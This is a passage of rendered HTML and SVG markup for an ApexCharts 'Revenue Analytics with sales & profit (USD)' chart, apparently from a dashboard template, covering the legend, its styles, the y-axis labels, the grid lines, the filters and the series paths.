                                            border-radius: 12px;
                                          "
                                        ></span
                                        ><span
                                          class="apexcharts-legend-text"
                                          rel="3"
                                          i="2"
                                          data:default-text="Sales"
                                          data:collapsed="false"
                                          style="
                                            color: rgb(55, 61, 63);
                                            font-size: 12px;
                                            font-weight: 400;
                                            font-family: Helvetica, Arial,
                                              sans-serif;
                                          "
                                          >Sales</span
                                        >
                                      </div>
                                      <div
                                        class="apexcharts-legend-series"
                                        rel="2"
                                        seriesname="Revenue"
                                        data:collapsed="false"
                                        style="margin: 2px 5px"
                                      >
                                        <span
                                          class="apexcharts-legend-marker"
                                          rel="2"
                                          data:collapsed="false"
                                          style="
                                            background: rgba(
                                              35,
                                              183,
                                              229,
                                              0.85
                                            ) !important;
                                            color: rgba(35, 183, 229, 0.85);
                                            height: 12px;
                                            width: 12px;
                                            left: 0px;
                                            top: 0px;
                                            border-width: 0px;
                                            border-color: rgb(255, 255, 255);
                                            border-radius: 12px;
                                          "
                                        ></span
                                        ><span
                                          class="apexcharts-legend-text"
                                          rel="2"
                                          i="1"
                                          data:default-text="Revenue"
                                          data:collapsed="false"
                                          style="
                                            color: rgb(55, 61, 63);
                                            font-size: 12px;
                                            font-weight: 400;
                                            font-family: Helvetica, Arial,
                                              sans-serif;
                                          "
                                          >Revenue</span
                                        >
                                      </div>
                                      <div
                                        class="apexcharts-legend-series"
                                        rel="1"
                                        seriesname="Profit"
                                        data:collapsed="false"
                                        style="margin: 2px 5px"
                                      >
                                        <span
                                          class="apexcharts-legend-marker"
                                          rel="1"
                                          data:collapsed="false"
                                          style="
                                            background: rgb(
                                              132,
                                              90,
                                              223
                                            ) !important;
                                            color: rgb(132, 90, 223);
                                            height: 12px;
                                            width: 12px;
                                            left: 0px;
                                            top: 0px;
                                            border-width: 0px;
                                            border-color: rgb(255, 255, 255);
                                            border-radius: 12px;
                                          "
                                        ></span
                                        ><span
                                          class="apexcharts-legend-text"
                                          rel="1"
                                          i="0"
                                          data:default-text="Profit"
                                          data:collapsed="false"
                                          style="
                                            color: rgb(55, 61, 63);
                                            font-size: 12px;
                                            font-weight: 400;
                                            font-family: Helvetica, Arial,
                                              sans-serif;
                                          "
                                          >Profit</span
                                        >
                                      </div>
                                    </div>
                                    <style type="text/css">
                                      .apexcharts-legend {
                                        display: flex;
                                        overflow: auto;
                                        padding: 0 10px;
                                      }
                                      .apexcharts-legend.apx-legend-position-bottom,
                                      .apexcharts-legend.apx-legend-position-top {
                                        flex-wrap: wrap;
                                      }
                                      .apexcharts-legend.apx-legend-position-right,
                                      .apexcharts-legend.apx-legend-position-left {
                                        flex-direction: column;
                                        bottom: 0;
                                      }
                                      .apexcharts-legend.apx-legend-position-bottom.apexcharts-align-left,
                                      .apexcharts-legend.apx-legend-position-top.apexcharts-align-left,
                                      .apexcharts-legend.apx-legend-position-right,
                                      .apexcharts-legend.apx-legend-position-left {
                                        justify-content: flex-start;
                                      }
                                      .apexcharts-legend.apx-legend-position-bottom.apexcharts-align-center,
                                      .apexcharts-legend.apx-legend-position-top.apexcharts-align-center {
                                        justify-content: center;
                                      }
                                      .apexcharts-legend.apx-legend-position-bottom.apexcharts-align-right,
                                      .apexcharts-legend.apx-legend-position-top.apexcharts-align-right {
                                        justify-content: flex-end;
                                      }
                                      .apexcharts-legend-series {
                                        cursor: pointer;
                                        line-height: normal;
                                      }
                                      .apexcharts-legend.apx-legend-position-bottom
                                        .apexcharts-legend-series,
                                      .apexcharts-legend.apx-legend-position-top
                                        .apexcharts-legend-series {
                                        display: flex;
                                        align-items: center;
                                      }
                                      .apexcharts-legend-text {
                                        position: relative;
                                        font-size: 14px;
                                      }
                                      .apexcharts-legend-text *,
                                      .apexcharts-legend-marker * {
                                        pointer-events: none;
                                      }
                                      .apexcharts-legend-marker {
                                        position: relative;
                                        display: inline-block;
                                        cursor: pointer;
                                        margin-right: 3px;
                                        border-style: solid;
                                      }

                                      .apexcharts-legend.apexcharts-align-right
                                        .apexcharts-legend-series,
                                      .apexcharts-legend.apexcharts-align-left
                                        .apexcharts-legend-series {
                                        display: inline-block;
                                      }
                                      .apexcharts-legend-series.apexcharts-no-click {
                                        cursor: auto;
                                      }
                                      .apexcharts-legend
                                        .apexcharts-hidden-zero-series,
                                      .apexcharts-legend
                                        .apexcharts-hidden-null-series {
                                        display: none !important;
                                      }
                                      .apexcharts-inactive-legend {
                                        opacity: 0.45;
                                      }
                                    </style></foreignObject
                                  >
                                  <text
                                    id="SvgjsText3485"
                                    font-family="Helvetica, Arial, sans-serif"
                                    x="10"
                                    y="0"
                                    text-anchor="start"
                                    dominant-baseline="auto"
                                    font-size=".8125rem"
                                    font-weight="semibold"
                                    fill="#8c9097"
                                    class="apexcharts-title-text"
                                    style="
                                      font-family: Helvetica, Arial, sans-serif;
                                      opacity: 1;
                                    "
                                  >
                                    Revenue Analytics with sales &amp; profit
                                    (USD)
                                  </text>
                                  <rect
                                    id="SvgjsRect3488"
                                    width="0"
                                    height="0"
                                    x="0"
                                    y="0"
                                    rx="0"
                                    ry="0"
                                    opacity="1"
                                    stroke-width="0"
                                    stroke="none"
                                    stroke-dasharray="0"
                                    fill="#fefefe"
                                  ></rect>
                                  <g
                                    id="SvgjsG3596"
                                    class="apexcharts-yaxis"
                                    rel="0"
                                    transform="translate(27.59375, 0)"
                                  >
                                    <g
                                      id="SvgjsG3597"
                                      class="apexcharts-yaxis-texts-g"
                                    >
                                      <text
                                        id="SvgjsText3599"
                                        font-family="Helvetica, Arial, sans-serif"
                                        x="20"
                                        y="51.5"
                                        text-anchor="end"
                                        dominant-baseline="auto"
                                        font-size="11px"
                                        font-weight="400"
                                        fill="#373d3f"
                                        class="apexcharts-text apexcharts-yaxis-label"
                                        style="
                                          font-family: Helvetica, Arial,
                                            sans-serif;
                                        "
                                      >
                                        <tspan id="SvgjsTspan3600">$1000</tspan>
                                        <title>$1000</title>
                                      </text>
                                      <text
                                        id="SvgjsText3602"
                                        font-family="Helvetica, Arial, sans-serif"
                                        x="20"
                                        y="100.3696"
                                        text-anchor="end"
                                        dominant-baseline="auto"
                                        font-size="11px"
                                        font-weight="400"
                                        fill="#373d3f"
                                        class="apexcharts-text apexcharts-yaxis-label"
                                        style="
                                          font-family: Helvetica, Arial,
                                            sans-serif;
                                        "
                                      >
                                        <tspan id="SvgjsTspan3603">$800</tspan>
                                        <title>$800</title>
                                      </text>
                                      <text
                                        id="SvgjsText3605"
                                        font-family="Helvetica, Arial, sans-serif"
                                        x="20"
                                        y="149.2392"
                                        text-anchor="end"
                                        dominant-baseline="auto"
                                        font-size="11px"
                                        font-weight="400"
                                        fill="#373d3f"
                                        class="apexcharts-text apexcharts-yaxis-label"
                                        style="
                                          font-family: Helvetica, Arial,
                                            sans-serif;
                                        "
                                      >
                                        <tspan id="SvgjsTspan3606">$600</tspan>
                                        <title>$600</title>
                                      </text>
                                      <text
                                        id="SvgjsText3608"
                                        font-family="Helvetica, Arial, sans-serif"
                                        x="20"
                                        y="198.10880000000003"
                                        text-anchor="end"
                                        dominant-baseline="auto"
                                        font-size="11px"
                                        font-weight="400"
                                        fill="#373d3f"
                                        class="apexcharts-text apexcharts-yaxis-label"
                                        style="
                                          font-family: Helvetica, Arial,
                                            sans-serif;
                                        "
                                      >
                                        <tspan id="SvgjsTspan3609">$400</tspan>
                                        <title>$400</title>
                                      </text>
                                      <text
                                        id="SvgjsText3611"
                                        font-family="Helvetica, Arial, sans-serif"
                                        x="20"
                                        y="246.97840000000002"
                                        text-anchor="end"
                                        dominant-baseline="auto"
                                        font-size="11px"
                                        font-weight="400"
                                        fill="#373d3f"
                                        class="apexcharts-text apexcharts-yaxis-label"
                                        style="
                                          font-family: Helvetica, Arial,
                                            sans-serif;
                                        "
                                      >
                                        <tspan id="SvgjsTspan3612">$200</tspan>
                                        <title>$200</title>
                                      </text>
                                      <text
                                        id="SvgjsText3614"
                                        font-family="Helvetica, Arial, sans-serif"
                                        x="20"
                                        y="295.848"
                                        text-anchor="end"
                                        dominant-baseline="auto"
                                        font-size="11px"
                                        font-weight="400"
                                        fill="#373d3f"
                                        class="apexcharts-text apexcharts-yaxis-label"
                                        style="
                                          font-family: Helvetica, Arial,
                                            sans-serif;
                                        "
                                      >
                                        <tspan id="SvgjsTspan3615">$0</tspan>
                                        <title>$0</title>
                                      </text>
                                    </g>
                                  </g>
                                  <g
                                    id="SvgjsG3484"
                                    class="apexcharts-inner apexcharts-graphical"
                                    transform="translate(57.59375, 50)"
                                  >
                                    <defs id="SvgjsDefs3483">
                                      <clipPath id="gridRectMaskwuayproi">
                                        <rect
                                          id="SvgjsRect3490"
                                          width="601.236328125"
                                          height="246.348"
                                          x="-3"
                                          y="-1"
                                          rx="0"
                                          ry="0"
                                          opacity="1"
                                          stroke-width="0"
                                          stroke="none"
                                          stroke-dasharray="0"
                                          fill="#fff"
                                        ></rect>
                                      </clipPath>
                                      <clipPath
                                        id="forecastMaskwuayproi"
                                      ></clipPath>
                                      <clipPath
                                        id="nonForecastMaskwuayproi"
                                      ></clipPath>
                                      <clipPath id="gridRectMarkerMaskwuayproi">
                                        <rect
                                          id="SvgjsRect3491"
                                          width="599.236328125"
                                          height="248.348"
                                          x="-2"
                                          y="-2"
                                          rx="0"
                                          ry="0"
                                          opacity="1"
                                          stroke-width="0"
                                          stroke="none"
                                          stroke-dasharray="0"
                                          fill="#fff"
                                        ></rect>
                                      </clipPath>
                                      <filter
                                        id="SvgjsFilter3497"
                                        filterUnits="userSpaceOnUse"
                                        width="200%"
                                        height="200%"
                                        x="-50%"
                                        y="-50%"
                                      >
                                        <feFlood
                                          id="SvgjsFeFlood3498"
                                          flood-color="#000000"
                                          flood-opacity="0.1"
                                          result="SvgjsFeFlood3498Out"
                                          in="SourceGraphic"
                                        ></feFlood>
                                        <feComposite
                                          id="SvgjsFeComposite3499"
                                          in="SvgjsFeFlood3498Out"
                                          in2="SourceAlpha"
                                          operator="in"
                                          result="SvgjsFeComposite3499Out"
                                        ></feComposite>
                                        <feOffset
                                          id="SvgjsFeOffset3500"
                                          dx="0"
                                          dy="8"
                                          result="SvgjsFeOffset3500Out"
                                          in="SvgjsFeComposite3499Out"
                                        ></feOffset>
                                        <feGaussianBlur
                                          id="SvgjsFeGaussianBlur3501"
                                          stdDeviation="3 "
                                          result="SvgjsFeGaussianBlur3501Out"
                                          in="SvgjsFeOffset3500Out"
                                        ></feGaussianBlur>
                                        <feMerge
                                          id="SvgjsFeMerge3502"
                                          result="SvgjsFeMerge3502Out"
                                          in="SourceGraphic"
                                        >
                                          <feMergeNode
                                            id="SvgjsFeMergeNode3503"
                                            in="SvgjsFeGaussianBlur3501Out"
                                          ></feMergeNode>
                                          <feMergeNode
                                            id="SvgjsFeMergeNode3504"
                                            in="[object Arguments]"
                                          ></feMergeNode>
                                        </feMerge>
                                        <feBlend
                                          id="SvgjsFeBlend3505"
                                          in="SourceGraphic"
                                          in2="SvgjsFeMerge3502Out"
                                          mode="normal"
                                          result="SvgjsFeBlend3505Out"
                                        ></feBlend>
                                      </filter>
                                      <filter
                                        id="SvgjsFilter3507"
                                        filterUnits="userSpaceOnUse"
                                        width="200%"
                                        height="200%"
                                        x="-50%"
                                        y="-50%"
                                      >
                                        <feFlood
                                          id="SvgjsFeFlood3508"
                                          flood-color="#000000"
                                          flood-opacity="0.1"
                                          result="SvgjsFeFlood3508Out"
                                          in="SourceGraphic"
                                        ></feFlood>
                                        <feComposite
                                          id="SvgjsFeComposite3509"
                                          in="SvgjsFeFlood3508Out"
                                          in2="SourceAlpha"
                                          operator="in"
                                          result="SvgjsFeComposite3509Out"
                                        ></feComposite>
                                        <feOffset
                                          id="SvgjsFeOffset3510"
                                          dx="0"
                                          dy="8"
                                          result="SvgjsFeOffset3510Out"
                                          in="SvgjsFeComposite3509Out"
                                        ></feOffset>
                                        <feGaussianBlur
                                          id="SvgjsFeGaussianBlur3511"
                                          stdDeviation="3 "
                                          result="SvgjsFeGaussianBlur3511Out"
                                          in="SvgjsFeOffset3510Out"
                                        ></feGaussianBlur>
                                        <feMerge
                                          id="SvgjsFeMerge3512"
                                          result="SvgjsFeMerge3512Out"
                                          in="SourceGraphic"
                                        >
                                          <feMergeNode
                                            id="SvgjsFeMergeNode3513"
                                            in="SvgjsFeGaussianBlur3511Out"
                                          ></feMergeNode>
                                          <feMergeNode
                                            id="SvgjsFeMergeNode3514"
                                            in="[object Arguments]"
                                          ></feMergeNode>
                                        </feMerge>
                                        <feBlend
                                          id="SvgjsFeBlend3515"
                                          in="SourceGraphic"
                                          in2="SvgjsFeMerge3512Out"
                                          mode="normal"
                                          result="SvgjsFeBlend3515Out"
                                        ></feBlend>
                                      </filter>
                                      <filter
                                        id="SvgjsFilter3521"
                                        filterUnits="userSpaceOnUse"
                                        width="200%"
                                        height="200%"
                                        x="-50%"
                                        y="-50%"
                                      >
                                        <feFlood
                                          id="SvgjsFeFlood3522"
                                          flood-color="#000000"
                                          flood-opacity="0.1"
                                          result="SvgjsFeFlood3522Out"
                                          in="SourceGraphic"
                                        ></feFlood>
                                        <feComposite
                                          id="SvgjsFeComposite3523"
                                          in="SvgjsFeFlood3522Out"
                                          in2="SourceAlpha"
                                          operator="in"
                                          result="SvgjsFeComposite3523Out"
                                        ></feComposite>
                                        <feOffset
                                          id="SvgjsFeOffset3524"
                                          dx="0"
                                          dy="8"
                                          result="SvgjsFeOffset3524Out"
                                          in="SvgjsFeComposite3523Out"
                                        ></feOffset>
                                        <feGaussianBlur
                                          id="SvgjsFeGaussianBlur3525"
                                          stdDeviation="3 "
                                          result="SvgjsFeGaussianBlur3525Out"
                                          in="SvgjsFeOffset3524Out"
                                        ></feGaussianBlur>
                                        <feMerge
                                          id="SvgjsFeMerge3526"
                                          result="SvgjsFeMerge3526Out"
                                          in="SourceGraphic"
                                        >
                                          <feMergeNode
                                            id="SvgjsFeMergeNode3527"
                                            in="SvgjsFeGaussianBlur3525Out"
                                          ></feMergeNode>
                                          <feMergeNode
                                            id="SvgjsFeMergeNode3528"
                                            in="[object Arguments]"
                                          ></feMergeNode>
                                        </feMerge>
                                        <feBlend
                                          id="SvgjsFeBlend3529"
                                          in="SourceGraphic"
                                          in2="SvgjsFeMerge3526Out"
                                          mode="normal"
                                          result="SvgjsFeBlend3529Out"
                                        ></feBlend>
                                      </filter>
                                      <filter
                                        id="SvgjsFilter3534"
                                        filterUnits="userSpaceOnUse"
                                        width="200%"
                                        height="200%"
                                        x="-50%"
                                        y="-50%"
                                      >
                                        <feFlood
                                          id="SvgjsFeFlood3535"
                                          flood-color="#000000"
                                          flood-opacity="0.1"
                                          result="SvgjsFeFlood3535Out"
                                          in="SourceGraphic"
                                        ></feFlood>
                                        <feComposite
                                          id="SvgjsFeComposite3536"
                                          in="SvgjsFeFlood3535Out"
                                          in2="SourceAlpha"
                                          operator="in"
                                          result="SvgjsFeComposite3536Out"
                                        ></feComposite>
                                        <feOffset
                                          id="SvgjsFeOffset3537"
                                          dx="0"
                                          dy="8"
                                          result="SvgjsFeOffset3537Out"
                                          in="SvgjsFeComposite3536Out"
                                        ></feOffset>
                                        <feGaussianBlur
                                          id="SvgjsFeGaussianBlur3538"
                                          stdDeviation="3 "
                                          result="SvgjsFeGaussianBlur3538Out"
                                          in="SvgjsFeOffset3537Out"
                                        ></feGaussianBlur>
                                        <feMerge
                                          id="SvgjsFeMerge3539"
                                          result="SvgjsFeMerge3539Out"
                                          in="SourceGraphic"
                                        >
                                          <feMergeNode
                                            id="SvgjsFeMergeNode3540"
                                            in="SvgjsFeGaussianBlur3538Out"
                                          ></feMergeNode>
                                          <feMergeNode
                                            id="SvgjsFeMergeNode3541"
                                            in="[object Arguments]"
                                          ></feMergeNode>
                                        </feMerge>
                                        <feBlend
                                          id="SvgjsFeBlend3542"
                                          in="SourceGraphic"
                                          in2="SvgjsFeMerge3539Out"
                                          mode="normal"
                                          result="SvgjsFeBlend3542Out"
                                        ></feBlend>
                                      </filter>
                                    </defs>
                                    <line
                                      id="SvgjsLine3489"
                                      x1="0"
                                      y1="0"
                                      x2="0"
                                      y2="244.348"
                                      stroke="#b6b6b6"
                                      stroke-dasharray="3"
                                      stroke-linecap="butt"
                                      class="apexcharts-xcrosshairs"
                                      x="0"
                                      y="0"
                                      width="1"
                                      height="244.348"
                                      fill="#b1b9c4"
                                      filter="none"
                                      fill-opacity="0.9"
                                      stroke-width="1"
                                    ></line>
                                    <g id="SvgjsG3543" class="apexcharts-grid">
                                      <g
                                        id="SvgjsG3544"
                                        class="apexcharts-gridlines-horizontal"
                                      >
                                        <line
                                          id="SvgjsLine3548"
                                          x1="0"
                                          y1="48.869600000000005"
                                          x2="595.236328125"
                                          y2="48.869600000000005"
                                          stroke="#f1f1f1"
                                          stroke-dasharray="3"
                                          stroke-linecap="butt"
                                          class="apexcharts-gridline"
                                        ></line>
                                        <line
                                          id="SvgjsLine3549"
                                          x1="0"
                                          y1="97.73920000000001"
                                          x2="595.236328125"
                                          y2="97.73920000000001"
                                          stroke="#f1f1f1"
                                          stroke-dasharray="3"
                                          stroke-linecap="butt"
                                          class="apexcharts-gridline"
                                        ></line>
                                        <line
                                          id="SvgjsLine3550"
                                          x1="0"
                                          y1="146.60880000000003"
                                          x2="595.236328125"
                                          y2="146.60880000000003"
                                          stroke="#f1f1f1"
                                          stroke-dasharray="3"
                                          stroke-linecap="butt"
                                          class="apexcharts-gridline"
                                        ></line>
                                        <line
                                          id="SvgjsLine3551"
                                          x1="0"
                                          y1="195.47840000000002"
                                          x2="595.236328125"
                                          y2="195.47840000000002"
                                          stroke="#f1f1f1"
                                          stroke-dasharray="3"
                                          stroke-linecap="butt"
                                          class="apexcharts-gridline"
                                        ></line>
                                      </g>
                                      <g
                                        id="SvgjsG3545"
                                        class="apexcharts-gridlines-vertical"
                                      ></g>
                                      <line
                                        id="SvgjsLine3554"
                                        x1="0"
                                        y1="244.348"
                                        x2="595.236328125"
                                        y2="244.348"
                                        stroke="transparent"
                                        stroke-dasharray="0"
                                        stroke-linecap="butt"
                                      ></line>
                                      <line
                                        id="SvgjsLine3553"
                                        x1="0"
                                        y1="1"
                                        x2="0"
                                        y2="244.348"
                                        stroke="transparent"
                                        stroke-dasharray="0"
                                        stroke-linecap="butt"
                                      ></line>
                                    </g>
                                    <g
                                      id="SvgjsG3546"
                                      class="apexcharts-grid-borders"
                                    >
                                      <line
                                        id="SvgjsLine3547"
                                        x1="0"
                                        y1="0"
                                        x2="595.236328125"
                                        y2="0"
                                        stroke="#f1f1f1"
                                        stroke-dasharray="3"
                                        stroke-linecap="butt"
                                        class="apexcharts-gridline"
                                      ></line>
                                      <line
                                        id="SvgjsLine3552"
                                        x1="0"
                                        y1="244.348"
                                        x2="595.236328125"
                                        y2="244.348"
                                        stroke="#f1f1f1"
                                        stroke-dasharray="3"
                                        stroke-linecap="butt"
                                        class="apexcharts-gridline"
                                      ></line>
                                      <line
                                        id="SvgjsLine3595"
                                        x1="0"
                                        y1="245.348"
                                        x2="595.236328125"
                                        y2="245.348"
                                        stroke="#e0e0e0"
                                        stroke-dasharray="0"
                                        stroke-width="1"
                                        stroke-linecap="butt"
                                      ></line>
                                    </g>
                                    <g
                                      id="SvgjsG3492"
                                      class="apexcharts-area-series apexcharts-plot-series"
                                    >
                                      <g
                                        id="SvgjsG3493"
                                        class="apexcharts-series"
                                        seriesName="Sales"
                                        data:longestSeries="true"
                                        rel="1"
                                        data:realIndex="2"
                                      >
                                        <path
                                          id="SvgjsPath3496"
                                          d="M 0 244.348 L 0 195.47840000000002C 18.93933771306818 195.47840000000002 35.17305575284091 114.84356 54.112393465909086 114.84356C 73.05173117897726 114.84356 89.28544921874999 217.46972 108.22478693181817 217.46972C 127.16412464488636 217.46972 143.39784268465908 212.58276 162.33718039772725 212.58276C 181.27651811079542 212.58276 197.51023615056818 127.06096 216.44957386363635 127.06096C 235.38891157670452 127.06096 251.62262961647727 117.28703999999999 270.56196732954544 117.28703999999999C 289.5013050426136 117.28703999999999 305.7350230823863 53.75655999999998 324.6743607954545 53.75655999999998C 343.6136985085227 53.75655999999998 359.8474165482954 138.05662 378.7867542613636 138.05662C 397.7260919744318 138.05662 413.95981001420455 128.28269999999998 432.8991477272727 128.28269999999998C 451.8384854403409 128.28269999999998 468.0722034801136 64.01917599999999 487.0115411931818 64.01917599999999C 505.95087890624995 64.01917599999999 522.1845969460227 133.414008 541.1239346590909 133.414008C 560.0632723721591 133.414008 576.2969904119318 127.06096 595.236328125 127.06096C 595.236328125 127.06096 595.236328125 127.06096 595.236328125 244.348M 595.236328125 127.06096z"
                                          fill="rgba(119, 119, 142, 0.05)"
                                          fill-opacity="1"
                                          stroke-opacity="1"
                                          stroke-linecap="butt"
                                          stroke-width="0"
                                          stroke-dasharray="0"
                                          class="apexcharts-area"
                                          index="2"
                                          clip-path="url(#gridRectMaskwuayproi)"
                                          filter="url(#SvgjsFilter3497)"
                                          pathTo="M 0 244.348 L 0 195.47840000000002C 18.93933771306818 195.47840000000002 35.17305575284091 114.84356 54.112393465909086 114.84356C 73.05173117897726 114.84356 89.28544921874999 217.46972 108.22478693181817 217.46972C 127.16412464488636 217.46972 143.39784268465908 212.58276 162.33718039772725 212.58276C 181.27651811079542 212.58276 197.51023615056818 127.06096 216.44957386363635 127.06096C 235.38891157670452 127.06096 251.62262961647727 117.28703999999999 270.56196732954544 117.28703999999999C 289.5013050426136 117.28703999999999 305.7350230823863 53.75655999999998 324.6743607954545 53.75655999999998C 343.6136985085227 53.75655999999998 359.8474165482954 138.05662 378.7867542613636 138.05662C 397.7260919744318 138.05662 413.95981001420455 128.28269999999998 432.8991477272727 128.28269999999998C 451.8384854403409 128.28269999999998 468.0722034801136 64.01917599999999 487.0115411931818 64.01917599999999C 505.95087890624995 64.01917599999999 522.1845969460227 133.414008 541.1239346590909 133.414008C 560.0632723721591 133.414008 576.2969904119318 127.06096 595.236328125 127.06096C 595.236328125 127.06096 595.236328125 127.06096 595.236328125 244.348M 595.236328125 127.06096z"
                                          pathFrom="M 0 244.348 L 0 195.47840000000002C 18.93933771306818 195.47840000000002 35.17305575284091 114.84356 54.112393465909086 114.84356C 73.05173117897726 114.84356 89.28544921874999 217.46972 108.22478693181817 217.46972C 127.16412464488636 217.46972 143.39784268465908 212.58276 162.33718039772725 212.58276C 181.27651811079542 212.58276 197.51023615056818 127.06096 216.44957386363635 127.06096C 235.38891157670452 127.06096 251.62262961647727 117.28703999999999 270.56196732954544 117.28703999999999C 289.5013050426136 117.28703999999999 305.7350230823863 53.75655999999998 324.6743607954545 53.75655999999998C 343.6136985085227 53.75655999999998 359.8474165482954 138.05662 378.7867542613636 138.05662C 397.7260919744318 138.05662 413.95981001420455 128.28269999999998 432.8991477272727 128.28269999999998C 451.8384854403409 128.28269999999998 468.0722034801136 64.01917599999999 487.0115411931818 64.01917599999999C 505.95087890624995 64.01917599999999 522.1845969460227 133.414008 541.1239346590909 133.414008C 560.0632723721591 133.414008 576.2969904119318 127.06096 595.236328125 127.06096C 595.236328125 127.06096 595.236328125 127.06096 595.236328125 244.348M 595.236328125 127.06096z"
                                        ></path>
                                        <path
                                          id="SvgjsPath3506"
                                          d="M 0 195.47840000000002C 18.93933771306818 195.47840000000002 35.17305575284091 114.84356 54.112393465909086 114.84356C 73.05173117897726 114.84356 89.28544921874999 217.46972 108.22478693181817 217.46972C 127.16412464488636 217.46972 143.39784268465908 212.58276 162.33718039772725 212.58276C 181.27651811079542 212.58276 197.51023615056818 127.06096 216.44957386363635 127.06096C 235.38891157670452 127.06096 251.62262961647727 117.28703999999999 270.56196732954544 117.28703999999999C 289.5013050426136 117.28703999999999 305.7350230823863 53.75655999999998 324.6743607954545 53.75655999999998C 343.6136985085227 53.75655999999998 359.8474165482954 138.05662 378.7867542613636 138.05662C 397.7260919744318 138.05662 413.95981001420455 128.28269999999998 432.8991477272727 128.28269999999998C 451.8384854403409 128.28269999999998 468.0722034801136 64.01917599999999 487.0115411931818 64.01917599999999C 505.95087890624995 64.01917599999999 522.1845969460227 133.414008 541.1239346590909 133.414008C 560.0632723721591 133.414008 576.2969904119318 127.06096 595.236328125 127.06096"
                                          fill="none"
                                          fill-opacity="1"
                                          stroke-opacity="1"
                                          stroke-linecap="butt"
                                          stroke-width="0"
                                          stroke-dasharray="0"
                                          class="apexcharts-area"
                                          index="2"
                                          clip-path="url(#gridRectMaskwuayproi)"
                                          filter="url(#SvgjsFilter3507)"
                                          pathTo="M 0 195.47840000000002C 18.93933771306818 195.47840000000002 35.17305575284091 114.84356 54.112393465909086 114.84356C 73.05173117897726 114.84356 89.28544921874999 217.46972 108.22478693181817 217.46972C 127.16412464488636 217.46972 143.39784268465908 212.58276 162.33718039772725 212.58276C 181.27651811079542 212.58276 197.51023615056818 127.06096 216.44957386363635 127.06096C 235.38891157670452 127.06096 251.62262961647727 117.28703999999999 270.56196732954544 117.28703999999999C 289.5013050426136 117.28703999999999 305.7350230823863 53.75655999999998 324.6743607954545 53.75655999999998C 343.6136985085227 53.75655999999998 359.8474165482954 138.05662 378.7867542613636 138.05662C 397.7260919744318 138.05662 413.95981001420455 128.28269999999998 432.8991477272727 128.28269999999998C 451.8384854403409 128.28269999999998 468.0722034801136 64.01917599999999 487.0115411931818 64.01917599999999C 505.95087890624995 64.01917599999999 522.1845969460227 133.414008 541.1239346590909 133.414008C 560.0632723721591 133.414008 576.2969904119318 127.06096 595.236328125 127.06096"
                                          pathFrom="M 0 195.47840000000002C 18.93933771306818 195.47840000000002 35.17305575284091 114.84356 54.112393465909086 114.84356C 73.05173117897726 114.84356 89.28544921874999 217.46972 108.22478693181817 217.46972C 127.16412464488636 217.46972 143.39784268465908 212.58276 162.33718039772725 212.58276C 181.27651811079542 212.58276 197.51023615056818 127.06096 216.44957386363635 127.06096C 235.38891157670452 127.06096 251.62262961647727 117.28703999999999 270.56196732954544 117.28703999999999C 289.5013050426136 117.28703999999999 305.7350230823863 53.75655999999998 324.6743607954545 53.75655999999998C 343.6136985085227 53.75655999999998 359.8474165482954 138.05662 378.7867542613636 138.05662C 397.7260919744318 138.05662 413.95981001420455 128.28269999999998 432.8991477272727 128.28269999999998C 451.8384854403409 128.28269999999998 468.0722034801136 64.01917599999999 487.0115411931818 64.01917599999999C 505.95087890624995 64.01917599999999 522.1845969460227 133.414008 541.1239346590909 133.414008C 560.0632723721591 133.414008 576.2969904119318 127.06096 595.236328125 127.06096"
                                          fill-rule="evenodd"
                                        ></path>
                                        <g
                                          id="SvgjsG3494"
                                          class="apexcharts-series-markers-wrap apexcharts-hidden-element-shown"
                                          data:realIndex="2"
                                        >
                                          <g class="apexcharts-series-markers">
                                            <circle
                                              id="SvgjsCircle3619"
                                              r="0"
                                              cx="0"
                                              cy="0"
                                              class="apexcharts-marker w71oge2pv"
                                              stroke="#ffffff"
                                              fill="rgba(119, 119, 142, 0.05)"
                                              fill-opacity="1"
                                              stroke-width="2"
                                              stroke-opacity="0.9"
                                              default-marker-size="0"
                                            ></circle>
                                          </g>
                                        </g>
                                      </g>
                                    </g>
                                    <g
                                      id="SvgjsG3516"
                                      class="apexcharts-line-series apexcharts-plot-series"
                                    >
                                      <g
                                        id="SvgjsG3517"
                                        class="apexcharts-series"
                                        seriesName="Profit"
                                        data:longestSeries="true"
                                        rel="1"
                                        data:realIndex="0"
                                      >
                                        <path
                                          id="SvgjsPath3520"
                                          d="M 0 219.91320000000002C 18.93933771306818 219.91320000000002 35.17305575284091 193.03492 54.112393465909086 193.03492C 73.05173117897726 193.03492 89.28544921874999 200.36536 108.22478693181817 200.36536C 127.16412464488636 200.36536 143.39784268465908 133.414008 162.33718039772725 133.414008C 181.27651811079542 133.414008 197.51023615056818 188.14796 216.44957386363635 188.14796C 235.38891157670452 188.14796 251.62262961647727 166.15664 270.56196732954544 166.15664C 289.5013050426136 166.15664 305.7350230823863 84.055712 324.6743607954545 84.055712C 343.6136985085227 84.055712 359.8474165482954 41.53915999999998 378.7867542613636 41.53915999999998C 397.7260919744318 41.53915999999998 413.95981001420455 158.8262 432.8991477272727 158.8262C 451.8384854403409 158.8262 468.0722034801136 158.8262 487.0115411931818 158.8262C 505.95087890624995 158.8262 522.1845969460227 193.03492 541.1239346590909 193.03492C 560.0632723721591 193.03492 576.2969904119318 144.16532 595.236328125 144.16532"
                                          fill="none"
                                          fill-opacity="1"
                                          stroke="rgba(132,90,223, 1)"
                                          stroke-opacity="1"
                                          stroke-linecap="butt"
                                          stroke-width="2"
                                          stroke-dasharray="0"
                                          class="apexcharts-line"
                                          index="0"
                                          clip-path="url(#gridRectMaskwuayproi)"
                                          filter="url(#SvgjsFilter3521)"
                                          pathTo="M 0 219.91320000000002C 18.93933771306818 219.91320000000002 35.17305575284091 193.03492 54.112393465909086 193.03492C 73.05173117897726 193.03492 89.28544921874999 200.36536 108.22478693181817 200.36536C 127.16412464488636 200.36536 143.39784268465908 133.414008 162.33718039772725 133.414008C 181.27651811079542 133.414008 197.51023615056818 188.14796 216.44957386363635 188.14796C 235.38891157670452 188.14796 251.62262961647727 166.15664 270.56196732954544 166.15664C 289.5013050426136 166.15664 305.7350230823863 84.055712 324.6743607954545 84.055712C 343.6136985085227 84.055712 359.8474165482954 41.53915999999998 378.7867542613636 41.53915999999998C 397.7260919744318 41.53915999999998 413.95981001420455 158.8262 432.8991477272727 158.8262C 451.8384854403409 158.8262 468.0722034801136 158.8262 487.0115411931818 158.8262C 505.95087890624995 158.8262 522.1845969460227 193.03492 541.1239346590909 193.03492C 560.0632723721591 193.03492 576.2969904119318 144.16532 595.236328125 144.16532"
